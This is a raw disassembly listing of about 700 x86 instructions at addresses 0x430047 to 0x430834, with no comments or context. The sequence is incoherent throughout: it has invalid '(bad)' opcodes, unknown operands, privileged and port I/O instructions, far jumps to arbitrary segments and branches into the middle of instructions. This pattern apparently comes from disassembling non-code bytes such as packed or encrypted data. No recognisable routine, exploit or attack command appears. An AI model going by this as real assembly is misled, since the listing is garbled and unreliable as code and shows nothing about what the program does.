  430047:	cs out dx,eax
  430049:	mov    edi,0x4d1f6074
  43004e:	sub    cl,bl
  430050:	mov    dl,0x8b
  430052:	test   BYTE PTR [ecx+0x5e],cl
  430055:	xchg   edx,eax
  430056:	daa    
  430057:	xor    DWORD PTR [edi-0x4c],0x47fb904d
  43005e:	ins    DWORD PTR es:[edi],dx
  43005f:	outs   dx,DWORD PTR ds:[esi]
  430060:	es dec esp
  430062:	and    DWORD PTR [ebp+0x43],edi
  430065:	sbb    ecx,0xffffffbb
  430068:	xor    al,0xbd
  43006a:	cmp    bh,BYTE PTR [edi+0x49]
  43006d:	rcr    ebp,cl
  43006f:	daa    
  430070:	jb     0x430090
  430072:	xchg   BYTE PTR [edx],dl
  430074:	mov    edi,0x857b0778
  430079:	and    ah,BYTE PTR [esi]
  43007b:	push   edx
  43007c:	mov    ebp,0xc87cc0d9
  430081:	or     ebx,esi
  430083:	xor    ch,ah
  430085:	add    eax,0x5f985053
  43008a:	pop    es
  43008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43008c:	aam    0x81
  43008e:	or     eax,0xfbec9808
  430093:	jbe    0x43002f
  430095:	mov    ?,esi
  430097:	not    ch
  430099:	jl     0x43001b
  43009b:	loope  0x43009e
  43009d:	into   
  43009e:	or     ah,BYTE PTR [eax]
  4300a0:	and    DWORD PTR [edx+edx*2+0x59],esi
  4300a4:	xor    bl,BYTE PTR [esi+0x5a3c4223]
  4300aa:	leave  
  4300ab:	fdivr  QWORD PTR [esi]
  4300ad:	sbb    BYTE PTR [eax-0x6f4ea5f6],al
  4300b3:	in     eax,dx
  4300b4:	jmp    0x6ed3bd56
  4300b9:	dec    esi
  4300ba:	jmp    DWORD PTR [esi]
  4300bc:	cmc    
  4300bd:	push   edx
  4300be:	repnz jmp 0x7aa6:0x84715099
  4300c6:	jb     0x430079
  4300c8:	out    0x18,eax
  4300ca:	sbb    al,0x9b
  4300cc:	pop    eax
  4300cd:	dec    ecx
  4300ce:	popf   
  4300cf:	add    DWORD PTR [ecx+0x7f7ea8a3],ecx
  4300d5:	push   cs
  4300d6:	test   al,0xd
  4300d8:	jecxz  0x43007c
  4300da:	adc    DWORD PTR [esp+ebp*8-0x1d],esp
  4300de:	sbb    DWORD PTR [esp-0x31],esi
  4300e2:	and    ah,ah
  4300e4:	mov    edx,0xf4ce5c89
  4300e9:	dec    ebx
  4300ea:	mov    ecx,0x30d8c97f
  4300ef:	mov    esp,0x71f587e6
  4300f4:	or     DWORD PTR [ebp-0x2a071d10],ecx
  4300fa:	add    BYTE PTR [edx-0x543b551c],al
  430100:	pop    ecx
  430101:	mov    eax,0xcd956118
  430106:	or     ebx,DWORD PTR [ecx-0x78]
  430109:	dec    esi
  43010a:	xchg   ebp,eax
  43010b:	mov    ah,0x40
  43010d:	jae    0x430149
  43010f:	jmp    0x1067ea69
  430114:	adc    eax,DWORD PTR [edi]
  430116:	mov    dl,0xec
  430118:	pcmpgtw mm0,QWORD PTR [esi-0x4d]
  43011c:	fnsave [ebp+0x48b0aadb]
  430122:	adc    bl,dl
  430124:	aad    0xc6
  430126:	mov    al,ds:0x66245888
  43012b:	out    0x1a,al
  43012d:	outs   dx,DWORD PTR ds:[esi]
  43012e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43012f:	ds test bl,bh
  430132:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430133:	ret    0x7032
  430136:	sahf   
  430137:	aad    0x90
  430139:	fisttp WORD PTR [eax+ebx*8]
  43013c:	inc    ebp
  43013d:	cmp    DWORD PTR [edx],0xffffffe3
  430140:	repz pop ebp
  430142:	or     DWORD PTR gs:[ebp+0x4b],0x8d3ed79f
  43014a:	mov    bl,0xe0
  43014c:	xchg   edi,eax
  43014d:	ret    0x762e
  430150:	mul    DWORD PTR [ebp-0x35]
  430153:	fcomip st,st(7)
  430155:	xchg   BYTE PTR [ecx],dl
  430157:	mov    bl,0x27
  430159:	mov    edi,?
  43015b:	pusha  
  43015c:	push   ds
  43015d:	push   ebx
  43015e:	inc    esp
  43015f:	nop
  430160:	popa   
  430161:	ret    0x561d
  430164:	push   ebx
  430165:	push   ss
  430166:	pusha  
  430167:	xchg   esi,eax
  430168:	xchg   ebp,eax
  430169:	dec    esp
  43016a:	(bad)  
  43016b:	lods   eax,DWORD PTR ds:[esi]
  43016c:	dec    ebx
  43016d:	dec    esi
  43016e:	fist   WORD PTR [esi]
  430170:	pusha  
  430171:	mov    BYTE PTR [ecx-0x71],ch
  430174:	mov    BYTE PTR [edx-0x33c43e28],ah
  43017a:	fistp  DWORD PTR [eax]
  43017c:	shr    BYTE PTR [esi+0x67],1
  43017f:	(bad)  
  430180:	shl    BYTE PTR [ecx+ebx*4-0x481f2801],0xfc
  430188:	mov    dl,0x22
  43018a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43018b:	push   cs
  43018c:	push   edi
  43018d:	popa   
  43018e:	sbb    BYTE PTR [ebx+ebx*8+0x64248252],dh
  430195:	test   al,0x7a
  430197:	sbb    ebp,ebp
  430199:	arpl   WORD PTR [ebp+ecx*2-0xb11b052],ax
  4301a0:	stc    
  4301a1:	inc    ebp
  4301a2:	(bad)  
  4301a4:	icebp  
  4301a5:	(bad)  
  4301a6:	sub    DWORD PTR [ebx+0x36b9f4dd],ecx
  4301ac:	xchg   ebp,eax
  4301ad:	inc    esi
  4301ae:	jmp    0xbdb7:0x9a05229c
  4301b5:	push   0x7e2b088d
  4301ba:	or     eax,0xec1f4b77
  4301bf:	push   ebx
  4301c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4301c1:	pop    es
  4301c2:	test   esi,eax
  4301c4:	loop   0x430232
  4301c6:	push   esp
  4301c7:	mov    BYTE PTR [eax],0x55
  4301ca:	aad    0x9d
  4301cc:	repz cli 
  4301ce:	(bad)  
  4301cf:	cmc    
  4301d0:	xchg   eax,esp
  4301d2:	shl    BYTE PTR [edi+0x38ad0a0c],0x21
  4301d9:	pop    edx
  4301da:	jo     0x43025b
  4301dc:	xor    edx,edx
  4301de:	js     0x4301cc
  4301e0:	xor    DWORD PTR [edx-0x7e],ebp
  4301e3:	pop    edi
  4301e4:	cs inc BYTE PTR fs:[eax]
  4301e8:	sti    
  4301e9:	pusha  
  4301ea:	push   0xb687c83
  4301ef:	aas    
  4301f0:	xor    ebp,DWORD PTR [ecx+0x79]
  4301f3:	daa    
  4301f4:	sub    eax,0x3bbc597b
  4301f9:	or     BYTE PTR [edx+esi*2+0xcdfdc84],ch
  430200:	jge    0x430231
  430202:	fstp   TBYTE PTR es:[edi-0x8b49004]
  430209:	popa   
  43020a:	adc    al,0x6d
  43020c:	mov    ch,cl
  43020e:	lea    ecx,[edi+0x24]
  430211:	xchg   DWORD PTR [ecx+ebp*1+0x2a],esp
  430215:	mov    dl,0xcb
  430217:	fld    QWORD PTR [edx]
  430219:	ja     0x4301ee
  43021b:	(bad)  
  43021c:	xor    esp,DWORD PTR [ebp-0x19]
  43021f:	std    
  430220:	push   es
  430221:	mov    ch,0x67
  430223:	jle    0x430236
  430225:	jmp    0x2ac6698e
  43022a:	xchg   edx,eax
  43022b:	jg     0x43022b
  43022d:	vpcmpeqd xmm2,xmm1,xmm7
  430231:	cmp    BYTE PTR ds:0x11d58931,bh
  430237:	int    0x2d
  430239:	stos   DWORD PTR es:[edi],eax
  43023a:	test   BYTE PTR [edi],al
  43023c:	and    al,0x97
  43023e:	in     al,0x17
  430240:	mov    bh,0xed
  430242:	push   es
  430243:	fmul   DWORD PTR [eax]
  430245:	adc    al,0x4
  430247:	retf   0x851e
  43024a:	(bad)  
  43024b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43024c:	dec    edi
  43024d:	mov    esp,0x66d6da2e
  430252:	clc    
  430253:	xchg   BYTE PTR [ebp+0xbe7541d],bh
  430259:	xchg   edi,eax
  43025a:	mov    esp,esp
  43025c:	or     DWORD PTR [ebx+0x10],0xfffffffd
  430260:	(bad)  [ebp-0x3e3cdd67]
  430266:	xchg   esi,eax
  430267:	daa    
  430268:	jecxz  0x43023d
  43026a:	loopne 0x4302dd
  43026c:	dec    DWORD PTR [esi+0xd]
  43026f:	cdq    
  430270:	push   es
  430271:	mov    eax,ds:0xa64e8e0
  430276:	or     bh,BYTE PTR [edx+0x3ceb3fdb]
  43027c:	stos   DWORD PTR es:[edi],eax
  43027d:	repz push edi
  43027f:	mov    al,0x8d
  430281:	push   ebx
  430282:	sub    ah,BYTE PTR [ecx-0x1e7a67fa]
  430288:	push   esp
  430289:	cli    
  43028a:	jbe    0x43021d
  43028c:	and    eax,0x54125331
  430291:	mov    al,ds:0x1ee3ac47
  430296:	adc    al,0x22
  430299:	fdivr  DWORD PTR [edi-0x222817d7]
  43029f:	mov    bh,0x38
  4302a1:	mov    al,ds:0x4a0b7403
  4302a6:	sub    BYTE PTR [eax+0x4],dh
  4302a9:	mov    bl,0x3e
  4302ab:	mov    dh,0x62
  4302ad:	adc    bl,0xf7
  4302b0:	dec    esp
  4302b1:	loop   0x4302e8
  4302b3:	xlat   BYTE PTR ds:[ebx]
  4302b4:	mov    WORD PTR [esi+ebx*8],ds
  4302b7:	aad    0x27
  4302b9:	(bad)  
  4302bb:	scas   al,BYTE PTR es:[di]
  4302bd:	jg     0x4302f4
  4302bf:	sbb    eax,0xc9606ee3
  4302c4:	xor    ebp,ecx
  4302c6:	jge    0x43032e
  4302c8:	icebp  
  4302c9:	test   eax,0xd4257d67
  4302ce:	mov    al,ds:0x68f90fde
  4302d3:	and    ebp,edx
  4302d5:	arpl   bp,cx
  4302d7:	mov    eax,0x3c24a4ca
  4302dc:	push   0x48f773fe
  4302e1:	jnp    0x4302ef
  4302e3:	inc    esi
  4302e4:	xor    ecx,DWORD PTR [ebp+edi*1+0xa8d8b7e]
  4302eb:	mov    eax,ds:0x91567f54
  4302f0:	out    0x27,al
  4302f2:	out    0xd1,eax
  4302f4:	jg     0x43031d
  4302f6:	(bad)  
  4302f7:	ss mov cl,0x2e
  4302fa:	pop    edx
  4302fb:	cs xchg esp,eax
  4302fd:	loopne 0x430323
  4302ff:	cmp    DWORD PTR [ebx+eax*1],ecx
  430302:	ja     0x430350
  430304:	add    dl,BYTE PTR [edi+0x2e]
  430307:	or     DWORD PTR ds:0xa823274,ebx
  43030d:	(bad)  [ebp-0x6b07c1ef]
  430313:	das    
  430314:	std    
  430315:	outs   dx,BYTE PTR ds:[esi]
  430316:	std    
  430317:	push   ds
  430318:	sbb    eax,0xbcb28660
  43031d:	test   bl,bl
  43031f:	push   edi
  430320:	or     dh,BYTE PTR [eax-0x50ab909a]
  430326:	mov    esp,0xe5b6c8b9
  43032b:	mov    cs,ecx
  43032d:	sub    DWORD PTR [ebx+0x34],esi
  430330:	sbb    DWORD PTR [eax+0x5e],edx
  430333:	adc    al,0xe4
  430335:	ficomp DWORD PTR [ebp+0x462f5d59]
  43033b:	push   es
  43033c:	fcmovu st,st(6)
  43033e:	dec    edi
  43033f:	scas   al,BYTE PTR es:[edi]
  430340:	cs std 
  430342:	and    DWORD PTR [ebx+0x25],ecx
  430345:	lods   eax,DWORD PTR ds:[esi]
  430346:	xchg   edi,eax
  430347:	js     0x4302e7
  430349:	add    dl,ah
  43034b:	jg     0x4302e9
  43034d:	loopne 0x43033c
  43034f:	imul   ecx,DWORD PTR [edx+ecx*2-0x22552eff],0xfffffff4
  430357:	enter  0x98be,0xb7
  43035b:	mov    eax,0x76dd7c15
  430360:	(bad)  
  430361:	loopne 0x4302e9
  430363:	cmp    BYTE PTR [eax-0x49],ah
  430366:	sbb    ax,0xd508
  43036a:	js     0x43036f
  43036c:	cmp    al,0xab
  43036e:	les    esp,FWORD PTR [ecx+0x15]
  430371:	(bad)  
  430372:	call   0xab5f:0x468dffc2
  430379:	icebp  
  43037a:	cmp    DWORD PTR [ebx-0x2215b8a0],0x2b637e7b
  430384:	pop    ss
  430385:	loop   0x430344
  430387:	test   al,0xf5
  430389:	mov    ah,0x38
  43038b:	(bad)  
  43038c:	shl    BYTE PTR es:[edi-0x5b],0x18
  430391:	jp     0x430352
  430393:	sub    ecx,ebx
  430395:	mov    al,0x81
  430397:	jmp    0x430324
  430399:	jbe    0x4303a4
  43039b:	lea    esi,[ebx]
  43039d:	jno    0x430412
  43039f:	jge    0x4303f4
  4303a1:	pop    ebx
  4303a2:	mov    bh,0x1c
  4303a4:	ds loopne 0x43033e
  4303a7:	sar    bh,cl
  4303a9:	and    al,0x6c
  4303ab:	mov    WORD PTR [ebx+0x58],ss
  4303ae:	repnz push cs
  4303b0:	inc    BYTE PTR [ecx-0x1433907]
  4303b6:	sbb    eax,0x75132f9c
  4303bb:	hlt    
  4303bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4303bd:	call   0x14da7e7b
  4303c2:	aaa    
  4303c3:	test   al,0xa7
  4303c5:	lods   al,BYTE PTR ds:[esi]
  4303c6:	popf   
  4303c7:	pop    esi
  4303c8:	xchg   edi,eax
  4303c9:	pop    ecx
  4303ca:	inc    esi
  4303cb:	not    BYTE PTR [esi+0x5029e74b]
  4303d1:	adc    esp,DWORD PTR [ebx]
  4303d3:	shl    DWORD PTR [ebx],1
  4303d5:	or     dh,BYTE PTR [esi-0x77]
  4303d8:	out    dx,eax
  4303d9:	dec    edi
  4303da:	lods   eax,DWORD PTR ds:[esi]
  4303db:	mov    DWORD PTR [esi-0x19],esi
  4303de:	push   DWORD PTR [edi+0xf]
  4303e1:	mov    DWORD PTR [eax+eax*4-0x70],ebp
  4303e5:	fs out dx,al
  4303e7:	inc    edi
  4303e8:	inc    eax
  4303e9:	mov    DWORD PTR [edi],ecx
  4303eb:	(bad)  [esi+0x37]
  4303ee:	test   al,0x15
  4303f0:	mov    eax,0x29e6b376
  4303f5:	pop    edx
  4303f6:	xor    BYTE PTR [ebx],bh
  4303f8:	pushaw 
  4303fa:	pop    edx
  4303fb:	bound  edi,QWORD PTR [edi+0x6a]
  4303fe:	push   esi
  4303ff:	mov    edi,0xc6b5ef98
  430404:	scas   eax,DWORD PTR es:[edi]
  430405:	(bad)  
  430406:	mov    ds:0xe72801bd,eax
  43040b:	and    eax,0x1771647b
  430410:	pusha  
  430411:	pop    ebp
  430412:	rcl    BYTE PTR [edx+0xb],cl
  430415:	ss loope 0x430454
  430418:	xchg   edx,eax
  430419:	(bad)  
  43041a:	aaa    
  43041b:	mov    dl,0xc9
  43041d:	add    eax,0xe7ad7c2b
  430422:	emms   
  430424:	arpl   sp,di
  430426:	js     0x4303be
  430428:	ror    DWORD PTR [ebx-0x16],1
  43042b:	repnz retf 
  43042d:	aam    0x97
  43042f:	cdq    
  430430:	jp     0x430488
  430432:	call   0x2c4:0xcd30c20b
  430439:	push   edx
  43043a:	pop    es
  43043b:	mov    al,0xb
  43043d:	adc    DWORD PTR [ecx],0xffffff90
  430440:	call   0xdb12880c
  430445:	ret    
  430446:	inc    esp
  430447:	cmp    al,BYTE PTR [ebp+0x2e408c67]
  43044d:	adc    eax,0x828b4a3e
  430452:	int    0x3c
  430454:	or     ah,BYTE PTR [eax+0xd]
  430457:	repnz in al,0xae
  43045a:	leave  
  43045b:	pop    edi
  43045c:	sbb    DWORD PTR [edi],ebx
  43045e:	sub    dl,bh
  430460:	std    
  430461:	test   BYTE PTR [ebp-0x2e],bh
  430464:	cmp    BYTE PTR [ebp-0x31],cl
  430467:	mov    ecx,0xa30d421b
  43046c:	test   al,0x85
  43046e:	jmp    0xe819:0xcfad3fce
  430475:	lea    ebx,[ecx+0x226b4e5c]
  43047b:	dec    esi
  43047c:	push   esp
  43047d:	loope  0x430497
  43047f:	or     eax,0xe62d8e8e
  430484:	xor    eax,0x57703cc1
  430489:	sub    al,0x0
  43048b:	bound  ebp,QWORD PTR [eax+eax*2+0x8341d68]
  430492:	loope  0x4304ba
  430494:	sbb    DWORD PTR [eax-0x7768384e],0x6c0fa96
  43049e:	pusha  
  43049f:	je     0x43046a
  4304a1:	imul   edx,DWORD PTR [edx+eax*1],0x58305ed8
  4304a8:	push   ss
  4304a9:	sub    BYTE PTR [ebx+0x3d],bh
  4304ac:	sub    eax,0xe9ff8984
  4304b1:	inc    ebx
  4304b2:	lahf   
  4304b3:	adc    DWORD PTR [edx+0x0],edi
  4304b6:	jle    0x4304c5
  4304b8:	xlat   BYTE PTR ds:[ebx]
  4304b9:	addr16 pop edx
  4304bb:	jmp    0xf562:0x31ce285c
  4304c2:	fisubr WORD PTR [eax+edx*2+0x920dafb]
  4304c9:	mov    ecx,0x907a91b2
  4304ce:	adc    bh,BYTE PTR [edx-0x447feb15]
  4304d4:	push   esp
  4304d5:	loope  0x430487
  4304d7:	jge    0x4304c7
  4304d9:	sbb    ah,BYTE PTR [ecx-0x4c]
  4304dc:	or     eax,0x9a498b8d
  4304e1:	mov    WORD PTR [edx+eiz*8],fs
  4304e4:	mov    ds:0x2a2b7336,eax
  4304e9:	aaa    
  4304ea:	xor    BYTE PTR [ecx],ch
  4304ec:	lods   al,BYTE PTR ds:[esi]
  4304ed:	sub    DWORD PTR [esp+eiz*2-0x14],0x2b
  4304f2:	ins    BYTE PTR es:[edi],dx
  4304f3:	je     0x430495
  4304f5:	inc    ebx
  4304f6:	jmp    0x4304bf
  4304f8:	sub    bh,BYTE PTR ds:0xebb390f8
  4304fe:	jp     0x430494
  430500:	stc    
  430501:	pop    edi
  430502:	test   al,0x31
  430504:	or     ebp,edi
  430506:	push   ebp
  430507:	js     0x4304da
  430509:	fisttp QWORD PTR [eax-0x5c1d702e]
  43050f:	adc    dl,BYTE PTR [edx]
  430511:	shl    DWORD PTR [esi-0x1d],1
  430514:	sbb    dl,bl
  430516:	ficomp DWORD PTR [edi+edx*2]
  430519:	add    esp,DWORD PTR [ebx+0x1e165f6a]
  43051f:	dec    esp
  430520:	jmp    0x430537
  430522:	mov    ebp,0x492c616e
  430527:	jle    0x4304ee
  430529:	fiadd  DWORD PTR [ebx+0x93ab99e]
  43052f:	pop    es
  430530:	hlt    
  430531:	and    bh,BYTE PTR [esp+edx*4]
  430534:	out    0xd9,al
  430536:	push   es
  430537:	sbb    al,0xa9
  430539:	and    edx,DWORD PTR [eax-0x12]
  43053c:	sbb    dh,BYTE PTR [esi+0x4afc655a]
  430542:	test   al,0x2c
  430544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430545:	push   0x5e478c7b
  43054a:	and    ecx,DWORD PTR ds:0xc89f0e1e
  430550:	mov    ch,0x6d
  430552:	pushf  
  430553:	rol    BYTE PTR [ebp+edx*4+0x61],0xd5
  430558:	gs xlat BYTE PTR cs:[ebx]
  43055b:	es out dx,eax
  43055d:	lods   eax,DWORD PTR ds:[esi]
  43055e:	mov    ebx,0xd471e2b3
  430563:	push   es
  430564:	jo     0x4305bd
  430566:	jo     0x4305bd
  430568:	sar    edx,cl
  43056a:	(bad)  
  43056b:	imul   esp,DWORD PTR [ebx+0x4e923745],0xffffffe7
  430572:	into   
  430573:	pop    edx
  430574:	jb     0x4305f2
  430576:	mov    dl,0xeb
  430578:	fwait
  430579:	jno    0x430503
  43057b:	popa   
  43057c:	jl     0x430517
  43057e:	ja     0x4305bd
  430580:	out    dx,al
  430581:	ret    
  430582:	or     DWORD PTR [edi],0xaf4d86bf
  430588:	mov    ch,0x69
  43058a:	jle    0x4305c8
  43058c:	dec    esi
  43058d:	dec    ecx
  43058e:	jb     0x43058e
  430590:	les    esp,FWORD PTR [eax+ebx*1-0x26]
  430594:	cmp    eax,0x7ec56122
  430599:	xchg   esi,eax
  43059a:	frstor [ecx+0x5643b36]
  4305a0:	(bad)  
  4305a1:	fistp  QWORD PTR [ecx+0x16]
  4305a4:	jl     0x43055b
  4305a6:	in     al,dx
  4305a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4305aa:	or     BYTE PTR [ebx-0x4d6fe2df],al
  4305b0:	(bad)  [ecx+edi*8-0x50]
  4305b4:	mov    ebp,0x10d776da
  4305b9:	push   es
  4305ba:	jne    0x430612
  4305bc:	retf   
  4305bd:	and    esp,0x8
  4305c0:	sub    ch,al
  4305c2:	(bad)  
  4305c3:	xchg   edi,eax
  4305c4:	xchg   esi,edi
  4305c6:	and    dh,BYTE PTR [edx+0x27461dda]
  4305cc:	test   al,0x3c
  4305ce:	or     DWORD PTR [esi-0x78],0xffffffe1
  4305d2:	add    DWORD PTR [ebp+0x127e39c9],esp
  4305d8:	int    0xa7
  4305da:	add    al,0x2
  4305dc:	cwde   
  4305dd:	sbb    BYTE PTR [ebx+ebp*4+0x59],bl
  4305e1:	lahf   
  4305e2:	jl     0x4305e2
  4305e4:	outs   dx,BYTE PTR ds:[esi]
  4305e5:	push   edi
  4305e6:	adc    bl,BYTE PTR [ecx]
  4305e8:	mov    ebp,0x1ea45495
  4305ed:	aas    
  4305ee:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4305f0:	inc    esp
  4305f1:	test   DWORD PTR [ebx],edi
  4305f3:	fnstenv [ebp+0x78]
  4305f6:	add    ecx,edi
  4305f8:	push   ss
  4305f9:	clc    
  4305fa:	xor    BYTE PTR [esi+eiz*4],ah
  4305fd:	cmc    
  4305fe:	(bad)  
  4305ff:	push   edi
  430600:	ins    BYTE PTR es:[edi],dx
  430601:	inc    ebx
  430602:	jmp    0xc450aca
  430607:	das    
  430608:	cmp    al,0xbb
  43060a:	lock adc BYTE PTR [esi-0x4d470df3],0xc4
  430612:	stc    
  430613:	push   edx
  430614:	or     eax,0x98f0216f
  430619:	push   ecx
  43061a:	xor    DWORD PTR [ebp-0x2660b386],0xa835745d
  430624:	ror    dl,1
  430626:	sub    BYTE PTR [ebp+0x285bab8c],dl
  43062c:	ret    
  43062d:	mov    esp,0x42ac27a5
  430632:	cmp    bh,0xa0
  430635:	adc    al,0x1c
  430637:	jmp    0xc447:0x593a52ba
  43063e:	popf   
  43063f:	ds (bad) 
  430642:	mov    ss,WORD PTR [eax+0x5]
  430645:	push   esi
  430646:	ret    0xaeb5
  430649:	cmp    eax,0x77a82fc1
  43064e:	leave  
  43064f:	ret    
  430650:	mov    ds:0xc26c18b9,eax
  430655:	sub    al,0xf
  430657:	aas    
  430658:	push   edx
  430659:	mov    eax,0x20ec49ea
  43065e:	into   
  43065f:	enter  0xdad,0x53
  430663:	mov    esi,0x56c54c95
  430668:	mov    edi,0x9691cd4
  43066d:	mov    DWORD PTR [edx],0x90cbf808
  430673:	aam    0xdb
  430675:	scas   eax,DWORD PTR es:[edi]
  430676:	sub    dl,BYTE PTR [esi]
  430678:	dec    ebp
  430679:	neg    BYTE PTR [eax+0x4c8e6c05]
  43067f:	sbb    DWORD PTR [esi],edx
  430681:	sub    edi,DWORD PTR [eax-0x77]
  430684:	jne    0x43066e
  430686:	jns    0x4306d0
  430688:	leave  
  430689:	adc    al,0xb6
  43068b:	push   ebx
  43068c:	sbb    al,0x13
  43068e:	or     BYTE PTR [ebp+0x281a8421],ch
  430694:	jp     0x430619
  430696:	sbb    edi,DWORD PTR [edx+0x40fbd4f8]
  43069c:	or     esp,DWORD PTR [ecx-0x546c820d]
  4306a2:	push   esi
  4306a3:	icebp  
  4306a4:	or     BYTE PTR [edx+0x17d93840],bl
  4306aa:	repz or ebx,DWORD PTR [edi+eiz*8-0x69353e3d]
  4306b2:	lods   al,BYTE PTR ds:[esi]
  4306b3:	fdiv   DWORD PTR [edx+0x3c93adff]
  4306b9:	dec    BYTE PTR [esi-0x73]
  4306bc:	mov    WORD PTR [ebp+0x1d],cs
  4306bf:	xor    al,0xde
  4306c1:	dec    ebp
  4306c2:	and    al,BYTE PTR ds:0x64708c43
  4306c8:	sub    edx,DWORD PTR [esi+0x1c]
  4306cb:	daa    
  4306cc:	loopne 0x4306da
  4306ce:	dec    ecx
  4306cf:	jb     0x43070b
  4306d1:	dec    ebx
  4306d2:	or     BYTE PTR [edi-0x57],dh
  4306d5:	ret    0x6b78
  4306d8:	sti    
  4306d9:	mov    edx,0xbbb4ea4d
  4306de:	arpl   WORD PTR [ebx-0x29],sp
  4306e1:	cdq    
  4306e2:	stos   DWORD PTR es:[edi],eax
  4306e3:	mov    ds:0x9b51710c,al
  4306e8:	std    
  4306e9:	out    dx,eax
  4306ea:	daa    
  4306eb:	mov    cl,0x7f
  4306ed:	cld    
  4306ee:	or     al,0x3f
  4306f0:	sbb    ebx,eax
  4306f2:	cld    
  4306f3:	mov    eax,ds:0x7bfa24da
  4306f8:	sub    al,0xaf
  4306fa:	mov    cl,0x42
  4306fc:	add    BYTE PTR [esi+0x69fe2d77],dh
  430702:	in     eax,dx
  430703:	mov    ecx,0xbd06e749
  430708:	lods   eax,DWORD PTR ds:[esi]
  430709:	xchg   ebp,eax
  43070a:	and    dh,0xac
  43070d:	cwde   
  43070e:	into   
  43070f:	xlat   BYTE PTR ds:[ebx]
  430710:	out    dx,al
  430711:	ret    0x82c3
  430714:	cmp    DWORD PTR [eax+ebx*2-0x7c],ebp
  430718:	inc    esp
  430719:	xchg   esi,eax
  43071a:	pop    edi
  43071b:	ja     0x430708
  43071d:	fistp  QWORD PTR [edi+eiz*8+0x22d5f389]
  430724:	and    DWORD PTR [ebp+0x40],0xffffffae
  430728:	cmc    
  430729:	xchg   edi,eax
  43072a:	lods   al,BYTE PTR ds:[esi]
  43072b:	mov    bh,bl
  43072d:	pxor   mm0,QWORD PTR [ebx-0x3e]
  430731:	outs   dx,DWORD PTR ds:[esi]
  430732:	into   
  430733:	pop    ss
  430734:	aaa    
  430735:	in     al,0x7d
  430737:	cwde   
  430738:	ins    BYTE PTR es:[edi],dx
  430739:	cli    
  43073a:	pop    ds
  43073b:	push   esp
  43073c:	in     eax,dx
  43073d:	iret   
  43073e:	sbb    BYTE PTR [edi-0x6e7cee07],0x19
  430745:	mov    ebp,DWORD PTR ds:0xf3b531f7
  43074b:	rcr    dl,1
  43074d:	adc    al,0x51
  43074f:	adc    ch,dl
  430751:	sar    BYTE PTR [esi],0x67
  430754:	xchg   edi,eax
  430755:	push   esp
  430756:	ja     0x4306ff
  430758:	cmp    DWORD PTR [ebp+0x37b3e6dd],edi
  43075e:	mov    esp,0x5dd8da06
  430763:	(bad)  
  430764:	call   0xef3:0x1cf017
  43076b:	ds ja  0x430747
  43076e:	imul   edx,DWORD PTR [ebp+0x2b],0x39
  430772:	fwait
  430773:	shl    DWORD PTR [ecx+ebx*8+0x63],1
  430777:	test   DWORD PTR [ebp-0x7f],eax
  43077a:	fistp  DWORD PTR [edi]
  43077c:	jp     0x430783
  43077e:	xchg   DWORD PTR [ebx],ebp
  430780:	xor    bl,BYTE PTR [ebp-0x2d]
  430783:	sar    DWORD PTR [ebx-0x6b],cl
  430786:	mov    esp,0x82d9b947
  43078b:	call   edx
  43078d:	retf   
  43078e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43078f:	aas    
  430790:	cli    
  430791:	mov    dh,0x6a
  430793:	push   ebp
  430794:	aaa    
  430795:	test   eax,0xcc8a364
  43079a:	(bad)  
  43079b:	(bad)  
  43079c:	jl     0x4307f5
  43079e:	out    0xb4,al
  4307a0:	sahf   
  4307a1:	nop
  4307a2:	cmc    
  4307a3:	inc    edi
  4307a4:	sbb    bl,BYTE PTR [ecx+ebx*4-0x20]
  4307a8:	and    ecx,DWORD PTR fs:[ecx]
  4307ab:	pop    esp
  4307ac:	lock ja 0x43076f
  4307af:	ins    BYTE PTR es:[edi],dx
  4307b0:	xor    eax,0x9cfab38
  4307b5:	adc    al,0x53
  4307b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307b8:	or     eax,edi
  4307ba:	in     eax,dx
  4307bb:	jp     0x43079f
  4307bd:	es pop esi
  4307bf:	aad    0x2b
  4307c1:	lods   al,BYTE PTR ds:[esi]
  4307c2:	pop    edi
  4307c3:	xlat   BYTE PTR ds:[ebx]
  4307c4:	stos   BYTE PTR es:[edi],al
  4307c5:	mov    al,ds:0x49a8957c
  4307ca:	pop    es
  4307cb:	mov    al,0x6d
  4307cd:	loope  0x4307b6
  4307cf:	sub    al,0x48
  4307d1:	xchg   ebx,edx
  4307d3:	pop    es
  4307d4:	and    al,0xc1
  4307d6:	mov    cs,WORD PTR [esi+0x58f051ab]
  4307dc:	dec    edx
  4307dd:	pop    es
  4307de:	mov    ah,0xd1
  4307e0:	int3   
  4307e1:	jle    0x430839
  4307e3:	stos   BYTE PTR es:[edi],al
  4307e4:	mov    ch,0x87
  4307e6:	es cli 
  4307e8:	push   es
  4307e9:	call   0x8ae6:0x3828c20f
  4307f0:	jp     0x430828
  4307f2:	arpl   WORD PTR [ebx+0x1d],bx
  4307f5:	repnz stc 
  4307f7:	sub    DWORD PTR [ecx-0x22],ecx
  4307fa:	dec    ebx
  4307fb:	cmp    edx,DWORD PTR [edx+ebx*4-0x41929f87]
  430802:	xchg   edx,eax
  430803:	xchg   esi,eax
  430804:	enter  0x77df,0xb0
  430808:	or     DWORD PTR [edi-0x4c],ebp
  43080b:	in     eax,0xae
  43080d:	mov    al,ds:0x729402b1
  430812:	push   ss
  430813:	pop    ecx
  430814:	retf   0x9a2d
  430817:	ss jae 0x4307fa
  43081a:	(bad)  
  43081b:	jnp    0x430858
  43081d:	icebp  
  43081e:	push   esi
  43081f:	out    0xae,al
  430821:	cmp    BYTE PTR [edi],bl
  430823:	in     al,0x27
  430825:	lods   eax,DWORD PTR ds:[esi]
  430826:	repz jmp 0x48a1:0x515191b3
  43082e:	xor    ecx,0x2
  430831:	shr    bl,cl
  430833:	cwde   
  430834:	repz xchg ebp,eax
